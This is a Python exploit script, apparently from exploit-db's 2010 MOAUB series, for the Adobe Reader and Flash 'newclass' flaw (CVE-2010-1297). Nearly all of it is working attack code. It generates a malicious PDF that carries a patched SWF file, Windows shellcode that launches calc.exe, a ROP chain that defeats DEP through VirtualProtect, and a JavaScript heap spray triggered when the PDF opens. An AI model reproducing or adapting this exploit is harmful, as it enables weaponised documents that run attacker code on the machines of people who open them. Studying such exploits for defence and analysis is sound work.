'''
  __  __  ____         _    _ ____  
 |  \/  |/ __ \   /\  | |  | |  _ \ 
 | \  / | |  | | /  \ | |  | | |_) |
 | |\/| | |  | |/ /\ \| |  | |  _ <    Day 1 (Binary Analysis)
 | |  | | |__| / ____ \ |__| | |_) |
 |_|  |_|\____/_/    \_\____/|____/ 

http://www.exploit-db.com/adobe-acrobat-newclass-invalid-pointer-vulnerability/
https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/14853.tar.gz (moaub1-adobe-newclass.tar.gz)

  Title             : Adobe Acrobat Reader and Flash Player “newclass” invalid pointer vulnerability
  Analysis          : http://www.abysssec.com
  Vendor            : http://www.adobe.com
  Impact            : Ciritical
  Contact           : shahin [at] abysssec.com , info  [at] abysssec.com
  Twitter           : @abysssec
  CVE               : CVE-2010-1297
  MOAUB Number      : MOAUB-01-BA
'''

import sys

class PDF:
     
	def __init__(self):
		self.xrefs = []
		self.eol = '\x0a'
		self.content = ''
		self.xrefs_offset = 0
		
	def header(self):
		self.content += '%PDF-1.6' + self.eol
		
	def obj(self, obj_num, data,flag):
		self.xrefs.append(len(self.content))
		self.content += '%d 0 obj' % obj_num
		if flag == 1:
			self.content += self.eol + '<< ' + data + ' >>' + self.eol
		else:
			self.content += self.eol + data + self.eol
		self.content += 'endobj' + self.eol

	def obj_SWFStream(self, obj_num, data, stream):
		self.xrefs.append(len(self.content))
		self.content += '%d 0 obj' % obj_num
		self.content += self.eol + '<< ' + data + '/Params << /Size %d >> /DL %d /Length %d' %(len(stream),len(stream),len(stream))
		self.content += ' >>' + self.eol
		self.content += 'stream' + self.eol + stream + self.eol + 'endstream' + self.eol
		self.content += 'endobj' + self.eol
	
	def obj_Stream(self, obj_num, data, stream):
		self.xrefs.append(len(self.content))
		self.content += '%d 0 obj' % obj_num
		self.content += self.eol + '<< ' + data + '/Length %d' %len(stream)
		self.content += ' >>' + self.eol
		self.content += 'stream' + self.eol + stream + self.eol + 'endstream' + self.eol
		self.content += 'endobj' + self.eol
		
	def ref(self, ref_num):
		return '%d 0 R' % ref_num
		
	def xref(self):
		self.xrefs_offset = len(self.content)
		self.content += 'xref' + self.eol
		self.content += '0 %d' % (len(self.xrefs) + 1)
		self.content += self.eol
		self.content += '0000000000 65535 f' + self.eol
		for i in self.xrefs:
			self.content += '%010d 00000 n' % i
			self.content += self.eol
    
	def trailer(self):
		self.content += 'trailer' + self.eol
		self.content += '<< /Size %d' % (len(self.xrefs) + 1)
		self.content += ' /Root ' + self.ref(1) + ' >> ' + self.eol
		self.content += 'startxref' + self.eol
		self.content += '%d' % self.xrefs_offset
		self.content += self.eol
		self.content += '%%EOF'
		
	def generate(self):
		return self.content


		
		
class Exploit:
     
    def convert_to_utf16(self, payload):
        enc_payload = ''
        for i in range(0, len(payload), 2):
            num = 0
            for j in range(0, 2):
                num += (ord(payload[i + j]) & 0xff) << (j * 8)
            enc_payload += '%%u%04x' % num
        return enc_payload
             
    def get_payload(self):        	
        # shellcode calc.exe
        payload =("\x90\x90\x90\x89\xE5\xD9\xEE\xD9\x75\xF4\x5E\x56\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
	          "\x43\x43\x43\x43\x43\x43\x37\x51\x5A\x6A\x41\x58\x50\x30\x41\x30\x41\x6B\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41"
		  "\x42\x58\x50\x38\x41\x42\x75\x4A\x49\x4B\x4C\x4B\x58\x51\x54\x43\x30\x43\x30\x45\x50\x4C\x4B\x51\x55\x47\x4C\x4C\x4B\x43\x4C"
		  "\x43\x35\x44\x38\x45\x51\x4A\x4F\x4C\x4B\x50\x4F\x44\x58\x4C\x4B\x51\x4F\x47\x50\x45\x51\x4A\x4B\x51\x59\x4C\x4B\x46\x54\x4C"
		  "\x4B\x43\x31\x4A\x4E\x46\x51\x49\x50\x4A\x39\x4E\x4C\x4C\x44\x49\x50\x42\x54\x45\x57\x49\x51\x48\x4A\x44\x4D\x45\x51\x49\x52"
		  "\x4A\x4B\x4B\x44\x47\x4B\x46\x34\x46\x44\x45\x54\x43\x45\x4A\x45\x4C\x4B\x51\x4F\x47\x54\x43\x31\x4A\x4B\x43\x56\x4C\x4B\x44"
		  "\x4C\x50\x4B\x4C\x4B\x51\x4F\x45\x4C\x45\x51\x4A\x4B\x4C\x4B\x45\x4C\x4C\x4B\x43\x31\x4A\x4B\x4C\x49\x51\x4C\x47\x54\x45\x54"
		  "\x48\x43\x51\x4F\x46\x51\x4C\x36\x43\x50\x46\x36\x45\x34\x4C\x4B\x50\x46\x50\x30\x4C\x4B\x47\x30\x44\x4C\x4C\x4B\x44\x30\x45"
		  "\x4C\x4E\x4D\x4C\x4B\x42\x48\x44\x48\x4D\x59\x4B\x48\x4B\x33\x49\x50\x43\x5A\x46\x30\x45\x38\x4C\x30\x4C\x4A\x45\x54\x51\x4F"
		  "\x42\x48\x4D\x48\x4B\x4E\x4D\x5A\x44\x4E\x50\x57\x4B\x4F\x4A\x47\x43\x53\x47\x4A\x51\x4C\x50\x57\x51\x59\x50\x4E\x50\x44\x50"
		  "\x4F\x46\x37\x50\x53\x51\x4C\x43\x43\x42\x59\x44\x33\x43\x44\x43\x55\x42\x4D\x50\x33\x50\x32\x51\x4C\x42\x43\x45\x31\x42\x4C"
		  "\x42\x43\x46\x4E\x45\x35\x44\x38\x42\x45\x43\x30\x41\x41")
        return payload


    def getSWF(self):
        try:
            #swfFile = sys.argv[2]
            fdR = open('flash.swf', 'rb+')
            strTotal = fdR.read()
            str1 = strTotal[:88]
            addr1 = '\x06\xa6\x17\x30'    #  addr = 0c0c0c0c			
            str2 = strTotal[92:533]
			#***************************   Bypass DEP by VirtualProtect   ********************************
            rop = ''
            rop += "\x77\xFA\x44\x7E"     # mov edi,esp   ret 4
            rop += "\x94\x28\xc2\x77"	  #add esp,20  pop ebp  ret
            rop += "AAAA"				  #padding
            rop += "\xD4\x1A\x80\x7C"     # VirtualProtect
            rop += "BBBB"			      # Ret Addr for VirtualProtect
            rop += "CCCC"			      # Param1	(lpAddress)
            rop += "DDDD"			      # Param2	(Size)
            rop += "EEEE"			      # Param3	(flNewProtect)
            rop += "\x10\xB0\xEF\x77"     # Param4    (Writable Address)
            rop += "AAAAAAAAAAAA"		  #padding
            rop += "\xC2\x4D\xC3\x77"	  #mov eax,edi   pop esi  ret
            rop += "AAAA"				  #padding
            rop += "\xF2\xE1\x12\x06"	  #add eax,94   ret
            rop += "\x70\xDC\xEE\x77"     #push esp   pop ebp   ret4
            rop += "\x16\x9A\x94\x7C"	  #mov [ebp-30],eax  ret
            rop += "AAAA"				  #padding
            rop += "\xC2\x4D\xC3\x77"     #mov eax,edi   pop esi  ret
            rop += "AAAA"				  #padding
            rop += "\xF2\xE1\x12\x06"	  #add eax,94   ret
            rop += "\x79\x9E\x83\x7C"	  #mov [ebp-2c],eax  ret
            rop += "\x27\x56\xEA\x77"	  #mov eax,6b3  ret
            rop += "\x14\x83\xE0\x77"	  #mov [ebp-28],eax  ret
            rop += "\xB4\x01\xF2\x77"	  #xor eax,eax  ret
            rop += "\x88\x41\x97\x7C"	  #add eax,40  pop ebp  ret
            rop += "AAAA"				  #padding
            rop += "\x70\xDC\xEE\x77"	  #push esp   pop ebp   ret4
            rop += "\xC0\x9E\xEF\x77"	  #mov [ebp-54],eax  ret
            rop += "AAAA"				  #padding
            rop += "\xC2\x4D\xC3\x77"	  #mov eax,edi   pop esi  ret
            rop += "AAAA"				  #padding
            rop += "\xC1\xF2\xC1\x77"	  #add eax,8 ret
            rop += "\xCF\x97\xDE\x77"	  #xchg eax,esp   ret
			
            str3 = strTotal[669:1249]
            alignESP = "\x83\xc4\x03"
            sc = self.get_payload()
			
            if len(sc) > 2118:
                print "[*] Error : payload length is long"
                return
            if len(sc) <= 2118:
                dif = 2118 - len(sc)
            while dif > 0 :
                sc += '\x90'
                dif = dif - 1
			
            str4 = strTotal[3370:3726]
			
            addr2 = '\xF2\x3D\x8D\x23'    #  Enter 0C75 , 81    RET	
			
            str5 = strTotal[3730:]
			
            fdW= open('exploit.swf', 'wb+')
            finalStr = str1+addr1+str2+rop+str3+alignESP+sc+str4+addr2+str5
            fdW.write(finalStr)	
           		
            #strTotal = open('exploit.swf', 'rb+').read()
            fdW.close()
            fdR.close()
            return finalStr
            
        except IOError:
            print '[*] Error : An IO error has occurred'
		
    def HeapSpray(self):
        spray = '''	
        function spray_heap()
        {
            var chunk_size, payload, nopsled;
             
            chunk_size = 0x1A0000;
            pointers = unescape("%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030%u33dd%u3030");
            pointerSled = unescape("<Contents>");
            while (pointerSled.length < chunk_size)
                pointerSled += pointerSled;
            pointerSled_len = chunk_size - (pointers.length + 20);       
            pointerSled = pointerSled.substring(0, pointerSled_len);
            heap_chunks = new Array();
            for (var i = 0 ; i < <CHUNKS> ; i++)
                heap_chunks[i] = pointerSled + pointers;
        }            
        
         
        spray_heap();   
        '''
		
        spray = spray.replace('<Contents>', '%u33dd%u3030')   # Pointer to XCHG ESP , EBX
        '''
Authplay.dll
		
303033DD             ? 87DC                 XCHG ESP,EBX

#############################################################
					 will do nothing	

303033DF             ? 45                   INC EBP
303033E0             ? 05 00898784          ADD EAX,84878900 
303033E5             ? 42                   INC EDX
303033E6             ? 05 008987E8          ADD EAX,E8878900
303033EB             ? 41                   INC ECX
303033EC             ? 05 008987EC          ADD EAX,EC878900
303033F1             ? 41                   INC ECX
303033F2             ? 05 008987F0          ADD EAX,F0878900
303033F7             ? 41                   INC ECX
303033F8             ? 05 008987F4          ADD EAX,F4878900
303033FD             ? 41                   INC ECX
303033FE             ? 05 005F5E5D          ADD EAX,5D5E5F00
30303403             . B8 01000000          MOV EAX,1
30303408             . 5B                   POP EBX
############################################################

30303409             . 83C4 30              ADD ESP,30
3030340C             . C3                   RETN

        '''

        spray = spray.replace('<CHUNKS>', '40')   #Chunk count
        return spray
		
def generate_pdf():
	exploit = Exploit()
	swfFile = 'exploit.swf'
	pdf = PDF()
	pdf.header()
	pdf.obj(1, '/MarkInfo<</Marked true>>/Type /Catalog/Pages ' + pdf.ref(2) + ' /OpenAction ' + pdf.ref(17),1)
	#pdf.obj(1, '/MarkInfo<</Marked true>>/Type /Catalog/Pages ' + pdf.ref(2) ,1)
	pdf.obj(2, '/Count 1/Type/Pages/Kids[ '+pdf.ref(3)+' ]',1)
	pdf.obj(3, '/Annots [ '+pdf.ref(5) +' ]/Parent '+pdf.ref(2) + " /Type/Page"+' /Contents '+pdf.ref(4) ,1)
	pdf.obj_Stream(4, '','')
	pdf.obj(5, '/RichMediaSettings '+pdf.ref(6)+' /NM ( ' + swfFile + ' ) /Subtype /RichMedia /Type /Annot /RichMediaContent '+pdf.ref(7)+' /Rect [ 266 116 430 204 ]',1)
	pdf.obj(6, '/Subtype /Flash /Activation '+pdf.ref(8)+' /Type /RichMediaSettings /Deactivation '+pdf.ref(9),1)  
	pdf.obj(7, '/Type /RichMediaContent /Assets '+pdf.ref(10) +' /Configurations [ ' + pdf.ref(11) + ']',1)
	pdf.obj(8, '/Type /RichMediaActivation /Condition /PO ',1)	
	pdf.obj(9, '/Type /RichMediaDeactivation /Condition /XD ',1)	
	pdf.obj(10, '/Names [('+ swfFile +') ' + pdf.ref(12)+' ]',1)	
	pdf.obj(11, '/Subtype /Flash /Type /RichMediaConfiguration /Name (ElFlash) /Instances [ '+pdf.ref(13) +' ]',1)	
	pdf.obj(12, '/EF <</F '+pdf.ref(14) +' >> /Type /Filespec /F ('+ swfFile +')',1)	
	pdf.obj(13, '/Subype /Flash /Params '+pdf.ref(15) +' /Type /RichMediaInstance /Asset '+ pdf.ref(12) ,1)
	pdf.obj_SWFStream(14, ' /Type /EmbeddedFile  ',exploit.getSWF() )  
	pdf.obj(15, '/Binding /Background /Type /RichMediaParams /FlashVars () /Settings '+pdf.ref(16),1)
	pdf.obj_Stream(16, '<</Length 0 >> ','')  
	pdf.obj(17, '/Type /Action /S /JavaScript /JS (%s)' % exploit.HeapSpray(),1) 
	
	pdf.xref()
	pdf.trailer()
	return pdf.generate()
	
def main():
	if len(sys.argv) != 2:
		print 'Usage: python %s [output file name]' % sys.argv[0]
		sys.exit(0)
	file_name = sys.argv[1]
	if not file_name.endswith('.pdf'):
		file_name = file_name + '.pdf'
	try:
		fd = open(file_name, 'wb+')
		fd.write(generate_pdf())
		fd.close()
		print '[-] PDF file generated and written to %s' % file_name
	except IOError:
		print '[*] Error : An IO error has occurred'
		print '[-] Exiting ...'
		sys.exit(-1)
if __name__ == '__main__':
	main()